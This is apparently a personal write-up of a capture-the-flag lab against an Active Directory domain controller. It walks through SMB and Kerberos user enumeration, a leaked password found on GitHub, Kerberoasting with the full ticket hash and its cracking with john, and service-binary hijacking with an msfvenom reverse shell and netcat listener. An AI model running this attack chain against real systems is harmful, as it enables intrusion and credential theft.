# nmap
```Bash
# Nmap 7.95 scan initiated Wed Aug 13 10:59:48 2025 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_ports.txt 10.201.18.225
Nmap scan report for 10.201.18.225
Host is up (0.33s latency).
Not shown: 63712 closed tcp ports (reset), 1802 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7990/tcp  open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49676/tcp open  unknown

Read data files from: /usr/share/nmap
# Nmap done at Wed Aug 13 11:01:25 2025 -- 1 IP address (1 host up) scanned in 96.57 seconds
```
DCs: LAB.ENTERPRISE.THM\
I tried guest, and here:
```Bash
crackmapexec smb 10.201.18.225 -u 'guest' -p '' --shares
```
```Bash
SMB         10.201.18.225   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.201.18.225   445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
SMB         10.201.18.225   445    LAB-DC           [+] Enumerated shares
SMB         10.201.18.225   445    LAB-DC           Share           Permissions     Remark
SMB         10.201.18.225   445    LAB-DC           -----           -----------     ------
SMB         10.201.18.225   445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.201.18.225   445    LAB-DC           C$                              Default share
SMB         10.201.18.225   445    LAB-DC           Docs            READ            
SMB         10.201.18.225   445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.201.18.225   445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.201.18.225   445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.201.18.225   445    LAB-DC           Users           READ            Users Share. Do Not Touch!
```
```Bash
crackmapexec smb 10.201.18.225 -u 'guest' -p '' --rid-brute | grep -i "SidTypeUser"
```
```Bash
SMB                      10.201.18.225   445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB                      10.201.18.225   445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```
```Bash
kerbrute userenum user.txt --dc $target -d LAB.ENTERPRISE.THM
```
```Bash
2025/08/13 11:39:22 >  [+] VALID USERNAME:       Guest@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       atlbitbucket@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       bitbucket@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       LAB-DC$@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       ENTERPRISE$@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       Administrator@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       spooks@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       nik@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       replication@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       contractor-temp@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       Cake@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       banana@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       joiner@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       varg@LAB.ENTERPRISE.THM
2025/08/13 11:39:22 >  [+] VALID USERNAME:       korone@LAB.ENTERPRISE.THM
```
Yup, nothing interesting
When access this URL: 10.201.18.225:7990. This website cross me to github, and found this:
```Bash
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$userName = ''
$userPassword = ''
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
```
```Bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:ToastyBoi! -dc-ip $target -request
```
I found this
```Bash
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$a03e7df41c84bba97252372500c09bf4$8ba0c1e7fb83849970f4adccafb500a60ea08c9badc169e93fcbc34012277e502c02028ede63df7ef969c341eac01461c573ade21899637b3d298151170047f4a81ca8b934227903e5a173e4c617e8f28faa0cefc948bf4c85a307ea44765929d34af38e3e966056bda09d615e51768507a3aba67bc9f761238c6db8c317bc7af746d495119c067438f96b1f824880d3b6ca42b6eead1747f7b59ff2552550b4b9faeb7a77c1a52474497c3f4373e596f109d9e57632a96759b801e3c0e4519e3f75a0843b8e56accbd8a6692ec5432a60c344081c5c4a307e63f7ccce9aa69341a51064c85e18f520d7b36121c9b08ba5b95aace65d63def111c7e9d016a2d88875bdb1b3a0629e2edc95289ed4179ce3e155206f90a72606300b3c8e3bbdb6088dbcfe231dd6484336f1f58b3c6fa154f1a6bb6d095ddb4a57ad41eb15b805a9c80de87ae045ad301c7d17461af1ff5bdc9876fba0e400b08302cc5aa747895da52f89a45265b20f1aa91f9b2175a1ebde32181fa54e79ec20c2970feaf11dcdeaa106161c6c52831ab82ec807fd4e2b053d3b8e755c2efa3d3f7d1c94deac993f953077df17cd89086b6a56487a5c38b72cecb08995668a68d53176ac89ee0ffe8f29f23bf4eed8ec05aa357eb1ed20188b050f6ec3304e94cd93f256d07997267dd2b8c2b91a61bd1623496a46a00659e749b2f9aac477166cf0e1f11ed786957d0c1548da050f2dcfef2cd04efca6349742a046f218bdb7cf57b4fbd6bb19e1fb32c5194e525d3539dbc1a09d070509fc3abe6c30b8b792ef200476bcc52b048cdcdbd6842243d15b20553cdfba81eb56a8936c297cb08cffeff8925753b897b60451bd72a897f798a2d3b231d57351cdfbc9a078413b7ec258ebad44fd4a470c4f5ee4319d6be1a96d0cfec0f50f966e5720da85c5440d80b4be8131f147841259d8d3448b93fbb9bd80f7eab0c433a44a8f1d18e4882a781ae5f2dce52f23a7ac8e8692221862307e80e961367e5a2292985ab2c64e406ef1696a8c96548b2aca823676ff4104866e5f6bb73fb44069936519ddf0745ae652803d4497e2665556716ef4543fe98a91176667a770a7502427e94dce61ca0106950f5f8ff32590abf1dd4c8adf8094547423c6353f735323198c27715bca719e4a07b1f5d6022584501f9aa966693ba5bb498addbcf04d963818cd8676ac35dd588b3f9843989ed42a79142335dd5620b1807cf4e4bdae964a5aa157c49bb9ca0baac2f8cafada1a5d602390acc2a2c859800374b71097baca1d1c288a041f21ec0fa078aa8ca1384ba6b1029662c315dd88c1ebceff223b8ae16f99590e8db15f03ce380ad7f5
```
Tried to crack this
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=krb5tgs
```
We found cred: **bitbucket:littleredbucket**
Ok, in smb share, i found 2 files, but can’t crack it
So, we need to use RDP
Ok, we use PowerUp.ps1 and find that **“zerotieroneservice”** service has vulnable. Ok, create reverse shell with mfsvenom and create a port with netcat
```Bash
sudo nc -nvlp 4444
```
Replace “ZeroTier One” with our reverse shell we just created. C:\Program Files (x86)\Zero Tier
Boom, we have revershell with admin!